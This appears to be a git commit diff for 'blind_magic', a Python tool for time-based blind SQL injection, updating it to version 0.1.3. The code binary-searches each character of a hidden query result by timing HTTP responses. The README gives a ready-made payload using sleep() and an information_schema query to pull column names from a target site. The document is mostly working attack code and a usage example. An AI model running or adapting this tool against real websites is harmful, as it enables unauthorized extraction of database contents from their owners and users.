188551afd7d6be13120bec2ec220ca8345d5dd4a
Tran Nhat Truong <truongprohaiphong@gmail.com>
2016-09-27 18:13:26 +0700

    update to 0.1.3

--- Blind_magic.py
+++ Blind_magic.py
@@ -13,20 +13,25 @@ class Blind_magic:
         self.end = 122
         self.requests_num = 0
         self.result = []
-    def l(self,l1_s=1,l2_s=1,l3_s=1,l4_s=1,l5_s=1,l1=1,l2=1,l3=1,l4=1,l5=1):
-        self.l5 = l5 + 1
-        self.l5_s = l5_s
-        self.l4 = l4 + 1
-        self.l4_s = l4_s
-        self.l3 = l3 + 1
-        self.l3_s = l3_s
-        self.l2 = l2 + 1
-        self.l2_s = l2_s
+        self.set_l1(0,0)
+        self.set_l2(0,0)
+        self.set_l3(0,0)
+        self.set_l4(0,0)
+    def set_l1(self,l1_s,l1):
         self.l1 = l1 + 1
         self.l1_s = l1_s
-    def _full_url(self,l1,l2,l3,l4,l5):
-        query = self.query.format(l1=l1,l2=l2,l3=l3,l4=l4,l5=l5)
-        condition_query = self.condition_query.format(QUERY=query,l1=l1,l2=l2,l3=l3,l4=l4,l5=l5,OPERATOR='{OPERATOR}',\
+    def set_l2(self,l2_s,l2):
+        self.l2 = l2 + 1
+        self.l2_s = l2_s
+    def set_l3(self,l3_s,l3):
+        self.l3 = l3 + 1
+        self.l3_s = l3_s
+    def set_l4(self,l4_s,l4):
+        self.l4 = l4 + 1
+        self.l4_s = l4_s
+    def _full_url(self,l1,l2,l3,l4):
+        query = self.query.format(l1=l1,l2=l2,l3=l3,l4=l4)
+        condition_query = self.condition_query.format(QUERY=query,l1=l1,l2=l2,l3=l3,l4=l4,OPERATOR='{OPERATOR}',\
                                                       CHAR='{CHAR}')
         base_query = self.base_query.format(CONDITION_QUERY=condition_query)
         return self.url + base_query
@@ -34,7 +39,6 @@ class Blind_magic:
         self.requests_num = self.requests_num + 1
     def _connect_delay(self,full_url,operator):
         full_url = full_url.format(OPERATOR=operator)
-        # print full_url
         start_time = datetime.now()
         try:
             r = requests.get(full_url,timeout=self.duration)
@@ -45,7 +49,6 @@ class Blind_magic:
         end_time = datetime.now()
         diff_time = end_time - start_time
         time_diff = diff_time.seconds
-        # print 'time diff='+str(time_diff)
         if time_diff >= self.duration:
             return 1
     def _time_base_handle(self,full_url,mid):
@@ -72,15 +75,30 @@ class Blind_magic:
             return mid
         return self._binary_search(full_url,start,end)
     def run(self):
-        result = ''
-        for l5 in range(self.l5):
-            for l4 in range(self.l4):
-                for l3 in range(self.l3):
-                    for l2 in range(self.l2):
-                        for l1 in range(1,self.l1):
-                            new_result = chr(self._binary_search(self._full_url(l1,l2,l3,l4,l5),self.start,self.end))
-                            if new_result == '\x00':
-                                break
-                            result = result + new_result
-                        self.result.append(result)
-                        result = ''
+		print "[START]: Welcome to Bl1nd_m4g1c"
+		print "[INFO]: Time-based mode selected, time delay for compare is "\
+		+str(self.duration)+"s, please check your sleep/wait_for value"
+		start_time = datetime.now()
+		result = ''
+		for l4 in range(self.l4):
+			print "[STATUS] l4 now:"+str(l4)+"/"+str(self.l4-1)
+			for l3 in range(self.l3):
+				print "[STATUS] l3 now:"+str(l3)+"/"+str(self.l3-1)
+				for l2 in range(self.l2):
+					print "[STATUS] l2 now:"+str(l2)+"/"+str(self.l2-1)
+					for l1 in range(1,self.l1):
+						print "[STATUS] l1 now:"+str(l1)+"/"+str(self.l1-1)
+						new_result = chr(self._binary_search(self._full_url(l1,l2,l3,l4),self.start,self.end))
+						if new_result == '\x00':
+							print "[INFO]: End of string, l1 gonna be reset"
+							break
+						print "[INFO]: Character founded:" + new_result
+						result = result + new_result
+					print "[OK]: New result is:" + result
+					self.result.append(result)
+					result = ''
+		end_time = datetime.now()
+		diff_time = end_time - start_time
+		time_diff = diff_time.seconds
+		print "[FINISH]: Total time:" + str(time_diff) + "s"
+		print "[FINISH]: Bl1nd_m4g1c has done her job, go http://github.com/truongtn/blind_magic"
--- README.md
+++ README.md
@@ -1,8 +1,8 @@
-# blind_magic 0.1.2  
+# blind_magic 0.1.3  
 Manual Blind SQL Injection  
   
 Some trick:  
-I supply to you 5 loop variables l1 to l5 {l1} {l2} {l3} {l4} {l5}  
+I supply to you 5 loop variables l1 to l4 {l1} {l2} {l3} {l4}  
   
 Blind query statament:  
 {CONDITION_QUERY}  
@@ -11,11 +11,12 @@ Blind query statament:
 {CHAR}  
   
 example:  
-b = Blind_magic()
-b.l(1,0,0,0,0,10,3,0,0,0)  
-b.url = "http://10.0.42.224/?q="  
+b = Blind_magic()  
+b.set_l1(1,10)  
+b.set_l2(0,1)  
+b.url = "http://localhost/test_site/?q="  
 b.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"  
 b.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"  
 b.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"  
 b.run()  
-print b.result   
+print b.result  
